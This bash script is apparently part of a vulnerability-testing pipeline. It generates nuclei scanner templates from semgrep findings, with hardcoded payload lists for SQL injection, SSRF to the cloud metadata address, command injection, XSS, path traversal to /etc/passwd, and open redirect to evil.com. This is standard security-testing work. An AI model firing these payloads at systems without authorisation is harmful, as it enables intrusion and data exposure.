#!/usr/bin/env bash
set -euo pipefail

# Generate targeted nuclei templates from semgrep findings
#
# Takes semgrep vulnerability findings and generates custom nuclei
# templates to test the specific endpoints where issues were found.
#
# Usage: ./scripts/generate-targeted-tests.sh <org> [options]
# Input: findings/<org>/semgrep-results/*.json
# Output: findings/<org>/custom-templates/*.yaml

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"

show_help() {
    cat << 'EOF'
Usage: ./scripts/generate-targeted-tests.sh <org-name> [options]

Generate custom nuclei templates from semgrep findings.

Options:
  --vuln-types <types>    Comma-separated vuln types to generate for
                          (default: sqli,ssrf,cmdi,xss,path-traversal)
  --base-url <url>        Base URL for the target application
  --endpoints-file <file> YAML file mapping files to endpoints
  --output-dir <dir>      Custom output directory
  -h, --help              Show this help

Vulnerability Types:
  sqli           SQL Injection
  ssrf           Server-Side Request Forgery
  cmdi           Command Injection
  xss            Cross-Site Scripting
  path-traversal Path/Directory Traversal
  deserialize    Insecure Deserialization
  redirect       Open Redirect

Output:
  findings/<org>/custom-templates/targeted-<hash>.yaml

The script will:
1. Parse semgrep findings for exploitable patterns
2. Extract file paths and code context
3. Attempt to identify API endpoints from code
4. Generate nuclei templates with appropriate payloads

Examples:
  ./scripts/generate-targeted-tests.sh acme-corp
  ./scripts/generate-targeted-tests.sh acme-corp --base-url https://api.acme.com
  ./scripts/generate-targeted-tests.sh acme-corp --endpoints-file endpoints.yaml
EOF
    exit 0
}

if [[ $# -lt 1 ]]; then
    show_help
fi

ORG="$1"
shift

# Defaults
VULN_TYPES="sqli,ssrf,cmdi,xss,path-traversal"
BASE_URL=""
ENDPOINTS_FILE=""
OUTPUT_DIR=""

while [[ $# -gt 0 ]]; do
    case "$1" in
        --vuln-types) VULN_TYPES="$2"; shift 2 ;;
        --base-url) BASE_URL="$2"; shift 2 ;;
        --endpoints-file) ENDPOINTS_FILE="$2"; shift 2 ;;
        --output-dir) OUTPUT_DIR="$2"; shift 2 ;;
        -h|--help) show_help ;;
        *) echo "Unknown option: $1"; show_help ;;
    esac
done

OUTPUT_DIR="${OUTPUT_DIR:-$(pwd)/findings/$ORG/custom-templates}"
MANIFEST_FILE="$OUTPUT_DIR/manifest.json"

mkdir -p "$OUTPUT_DIR"

# Verify semgrep results exist using extraction script
if ! "$SCRIPT_DIR/extract-semgrep-findings.sh" "$ORG" count >/dev/null 2>&1; then
    echo "Error: Semgrep results not found for $ORG"
    exit 1
fi

echo "========================================"
echo "Targeted Test Generation: $ORG"
echo "========================================"
echo "Vuln types: $VULN_TYPES"
echo "Output: $OUTPUT_DIR/"
echo ""

# Initialize manifest
cat > "$MANIFEST_FILE" << EOF
{
  "generated_time": "$(date -Iseconds)",
  "organization": "$ORG",
  "templates": []
}
EOF

# Rule patterns for each vuln type
declare -A VULN_PATTERNS
VULN_PATTERNS[sqli]="sql|query|database|db\.|execute.*sql"
VULN_PATTERNS[ssrf]="ssrf|url|fetch|request|http.*get|urllib|requests\."
VULN_PATTERNS[cmdi]="command|exec|shell|system|popen|subprocess|child_process"
VULN_PATTERNS[xss]="xss|innerhtml|v-html|dangerouslysetinnerhtml|template.*inject"
VULN_PATTERNS[path-traversal]="path.*traversal|directory|file.*include|lfi|readfile"
VULN_PATTERNS[deserialize]="deseriali|pickle|yaml\.load|unserialize|objectinputstream"
VULN_PATTERNS[redirect]="redirect|location.*header|url.*redirect"

# Payloads for each vuln type
declare -A VULN_PAYLOADS
VULN_PAYLOADS[sqli]="' OR '1'='1|1' OR '1'='1'--|' UNION SELECT NULL--|1; SELECT SLEEP(5)--|' AND '1'='2"
VULN_PAYLOADS[ssrf]="http://169.254.169.254/|http://localhost:22/|http://127.0.0.1:6379/|http://[::1]/|http://0.0.0.0/"
VULN_PAYLOADS[cmdi]="; id|&& id|\$(id)|\`id\`|; sleep 5|&& sleep 5"
VULN_PAYLOADS[xss]="<script>alert(1)</script>|<img src=x onerror=alert(1)>|javascript:alert(1)|<svg onload=alert(1)>"
VULN_PAYLOADS[path-traversal]="../../../etc/passwd|....//....//etc/passwd|..%252f..%252f..%252fetc/passwd|/etc/passwd"
VULN_PAYLOADS[deserialize]=""  # Too context-specific
VULN_PAYLOADS[redirect]="//evil.com|https://evil.com|/\\evil.com|//evil%E3%80%82com"

# Matchers for each vuln type
declare -A VULN_MATCHERS
VULN_MATCHERS[sqli]="SQL syntax|mysql_fetch|ORA-|PostgreSQL|sqlite3|syntax error"
VULN_MATCHERS[ssrf]="ami-|meta-data|root:x:|localhost|127.0.0.1"
VULN_MATCHERS[cmdi]="uid=|root:|bin/bash|/bin/sh"
VULN_MATCHERS[xss]="<script>alert(1)</script>|onerror=alert"
VULN_MATCHERS[path-traversal]="root:x:0:0|\\[boot loader\\]|; for 16-bit"
VULN_MATCHERS[deserialize]=""
VULN_MATCHERS[redirect]=""

templates_generated=0
findings_processed=0

echo "Processing semgrep findings..."

# Process findings using extraction script with jsonl format
while IFS= read -r finding; do
    ((findings_processed++))

    repo_name=$(echo "$finding" | jq -r '.repo')
    check_id=$(echo "$finding" | jq -r '.check_id')
    file_path=$(echo "$finding" | jq -r '.path')
    line_num=$(echo "$finding" | jq -r '.start.line')
    matched_code=$(echo "$finding" | jq -r '.extra.lines // ""')
    severity=$(echo "$finding" | jq -r '.extra.severity')
    message=$(echo "$finding" | jq -r '.extra.message // ""')

    # Determine vuln type from check_id
    detected_type=""
    for vtype in ${VULN_TYPES//,/ }; do
        pattern="${VULN_PATTERNS[$vtype]:-}"
        if [[ -n "$pattern" ]] && echo "$check_id $message" | grep -qiE "$pattern"; then
            detected_type="$vtype"
            break
        fi
    done

    # Skip if no matching vuln type
    [[ -z "$detected_type" ]] && continue

    # Skip if no payloads for this type
    payloads="${VULN_PAYLOADS[$detected_type]:-}"
    [[ -z "$payloads" ]] && continue

    # Generate template ID
    template_hash=$(echo "$check_id$file_path$line_num" | md5sum | cut -c1-8 2>/dev/null || echo "$RANDOM")
    template_id="targeted-${detected_type}-${template_hash}"
    template_file="$OUTPUT_DIR/${template_id}.yaml"

    # Try to extract endpoint hint from file path
    endpoint_hint=""
    if [[ "$file_path" =~ (api|routes|handlers|controllers|endpoints) ]]; then
        # Extract potential endpoint from filename
        basename_file=$(basename "$file_path" | sed 's/\.[^.]*$//')
        endpoint_hint="/$basename_file"
    fi

    # Build payload array
    IFS='|' read -ra payload_array <<< "$payloads"
    payload_yaml=""
    for p in "${payload_array[@]}"; do
        payload_yaml="${payload_yaml}        - \"${p}\"\n"
    done

    # Build matchers
    matchers="${VULN_MATCHERS[$detected_type]:-}"
    matcher_yaml=""
    if [[ -n "$matchers" ]]; then
        IFS='|' read -ra matcher_array <<< "$matchers"
        for m in "${matcher_array[@]}"; do
            matcher_yaml="${matcher_yaml}          - \"${m}\"\n"
        done
    fi

    # Generate nuclei template
    cat > "$template_file" << TEMPLATE
id: ${template_id}

info:
  name: ${detected_type^^} in ${file_path}:${line_num}
  author: threat-hunting-pipeline
  severity: ${severity,,}
  description: |
    Semgrep detected potential ${detected_type^^} vulnerability.

    Rule: ${check_id}
    File: ${file_path}:${line_num}
    Code: ${matched_code:0:200}
  tags: targeted,${detected_type},semgrep-derived
  metadata:
    semgrep_rule: ${check_id}
    source_file: ${file_path}
    source_line: ${line_num}

# NOTE: You must configure the target endpoint manually
# Hint from file path: ${endpoint_hint:-/CONFIGURE_ENDPOINT}
# Base URL: ${BASE_URL:-https://TARGET_URL}

http:
  - method: GET
    path:
      - "{{BaseURL}}${endpoint_hint:-/api/CONFIGURE}"

    payloads:
      fuzz:
$(echo -e "$payload_yaml")
    fuzzing:
      - part: query
        type: postfix
        mode: single
        fuzz:
          - "{{fuzz}}"

$(if [[ -n "$matcher_yaml" ]]; then
cat << MATCHERS
    matchers-condition: or
    matchers:
      - type: word
        words:
$(echo -e "$matcher_yaml")
      - type: status
        status:
          - 500
MATCHERS
else
cat << MATCHERS
    matchers:
      - type: status
        status:
          - 500
MATCHERS
fi)

# Manual testing notes:
# 1. Update {{BaseURL}} with target URL
# 2. Configure the correct endpoint path
# 3. Adjust fuzzing location (query, body, header) based on context
# 4. Run: nuclei -t ${template_file} -u https://target.com
TEMPLATE

    ((templates_generated++))

    # Add to manifest
    jq --arg id "$template_id" \
       --arg type "$detected_type" \
       --arg file "$file_path" \
       --arg line "$line_num" \
       --arg rule "$check_id" \
       --arg template "$template_file" \
       '.templates += [{
         "id": $id,
         "vuln_type": $type,
         "source_file": $file,
         "source_line": $line,
         "semgrep_rule": $rule,
         "template_file": $template
       }]' "$MANIFEST_FILE" > "${MANIFEST_FILE}.tmp" && mv "${MANIFEST_FILE}.tmp" "$MANIFEST_FILE"

done < <("$SCRIPT_DIR/extract-semgrep-findings.sh" "$ORG" jsonl)

echo ""
echo "========================================"
echo "Summary"
echo "========================================"
echo "Findings processed: $findings_processed"
echo "Templates generated: $templates_generated"
echo ""

if [[ "$templates_generated" -gt 0 ]]; then
    echo "Templates by type:"
    jq -r '.templates | group_by(.vuln_type) | .[] | "  \(.[0].vuln_type): \(length)"' "$MANIFEST_FILE"
    echo ""
    echo "Generated templates:"
    ls -1 "$OUTPUT_DIR"/*.yaml 2>/dev/null | head -10 | sed 's/^/  /'
    if [[ $(ls -1 "$OUTPUT_DIR"/*.yaml 2>/dev/null | wc -l) -gt 10 ]]; then
        echo "  ... and more"
    fi
fi

echo ""
echo "Output: $OUTPUT_DIR/"
echo "Manifest: $MANIFEST_FILE"
echo ""
echo "*** IMPORTANT ***"
echo "Generated templates require manual configuration:"
echo "1. Set the correct target endpoint paths"
echo "2. Configure fuzzing locations (query/body/header)"
echo "3. Adjust payloads for the specific context"
echo ""
echo "Run templates:"
echo "  nuclei -t $OUTPUT_DIR/ -u https://target.com"
